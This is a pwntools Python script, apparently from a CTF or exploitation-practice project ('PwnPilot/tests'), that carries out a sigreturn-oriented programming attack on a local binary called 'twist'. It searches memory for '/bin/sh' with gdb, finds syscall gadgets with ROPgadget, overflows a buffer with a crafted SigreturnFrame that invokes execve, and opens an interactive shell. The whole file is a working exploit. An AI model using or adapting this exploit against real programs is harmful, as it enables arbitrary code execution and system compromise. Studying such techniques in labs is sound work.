from pwn import *
import time
import subprocess
import sys
import re
import argparse

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6',checksec=True)

def identify(binsh):
    pattern = r'0x[0-9a-fA-F]+'
    data_str = binsh.decode('utf-8', 'ignore')
    matches = re.findall(pattern, data_str)
    matches = re.findall(pattern, data_str)
    matches = re.findall(pattern, data_str)
    if not matches:
        vprint("Binsh not found")
    return matches[2]
def get_sigreturn_frame(rop, bin):
    frame = SigreturnFrame()
    frame.rax = int(constants.SYS_execve)
    frame.rdi = bin
    frame.rip = rop.find_gadget(['syscall'])[0]
    return bytes(frame)
def address_to_bytes(address):
    int_address = int(address, 16)
    bytes_address = int_address.to_bytes(8, byteorder='little')
    return bytes_address
def search_bin_sh(binary_name):
   pr = process(["gdb", binary_name])
   pr.recvuntil("gef➤")
   pr.sendline("start")
   binsh=pr.recvuntil("gef➤")
   pr.sendline("search-pattern /bin/sh")
   binsh=pr.recvuntil("gef➤")
   bin=identify(binsh)
   pr.kill()
   return int(bin, 16)

def getSigReturn(binary_name):
    rop=ROP(binary_name)
    os.system(''' ROPgadget --binary '''+binary_name+ '''| grep ": mov eax, 0xf ; syscall" > sigreturn.txt''' )
    pop_rax = rop.find_gadget(['pop rax'])[0]
    syscall = rop.find_gadget(['syscall'])[0]
    if os.path.getsize('sigreturn.txt') == 0:
       payload = p64(pop_rax)
       payload += p64(0xf)
       payload += p64(syscall)
       os.system('rm'+' sigreturn.txt')
       return payload
    with open('sigreturn.txt', 'r') as file:
      first_line = file.readline().strip()
      address = first_line.split()[0]
      first_address = address_to_bytes(address)
    os.system('rm'+' sigreturn.txt')
    return first_address

context.binary = binary = ELF("/home/kali/PwnPilot/tests/twist")

bin = search_bin_sh('/home/kali/PwnPilot/tests/twist')
rop=ROP(binary)
frame = get_sigreturn_frame(rop, bin)
sigreturn=getSigReturn("/home/kali/PwnPilot/tests/twist")
payload = b"a"*16
payload += sigreturn
payload += frame
s=process("/home/kali/PwnPilot/tests/twist")
s.send(payload)
s.interactive()